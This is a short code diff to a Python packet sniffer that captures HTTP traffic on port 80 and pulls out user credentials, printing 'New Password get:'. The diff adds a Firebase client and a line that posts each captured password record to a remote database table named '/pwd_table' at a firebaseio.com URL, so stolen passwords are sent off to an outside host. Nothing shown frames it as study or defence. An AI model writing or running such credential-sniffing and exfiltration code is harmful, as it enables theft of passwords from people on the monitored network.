@@ -3,14 +3,17 @@ import pcap
 import re
 import socket
 import urlparse
+from firebase import firebase
 from pprint import pprint
 
 APP_TO_PORT = {80: 'http'}
+FIREBASE_URL = "https://amber-inferno-5029.firebaseio.com"
 
 
 class Sniffer(object):
     def __init__(self, protocol='HTTP', interface=None):
 
+        self._firebase = firebase.FirebaseApplication(FIREBASE_URL, None)
         self.protocol = protocol
         if self.protocol == 'HTTP':
             pattern = 'tcp and dst port 80'
@@ -75,6 +78,7 @@ class Sniffer(object):
 
         print "New Password get:"
         pprint(self.all_user_info[self.info_counter])
+        self._firebase.post('/pwd_table', self.all_user_info[self.info_counter])
 
     def _get_http_payload(self, ip_pkt, tcp_pkt):
         try:
